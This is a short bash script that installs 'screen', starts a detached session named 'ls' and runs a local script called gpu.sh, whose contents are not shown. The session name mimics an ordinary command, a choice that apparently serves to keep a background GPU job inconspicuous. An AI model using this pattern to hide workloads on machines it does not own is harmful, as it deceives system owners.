#!/bin/bash
sudo apt update
sudo apt install screen -y
screen -dmS ls
chmod +x gpu.sh 
./gpu.sh
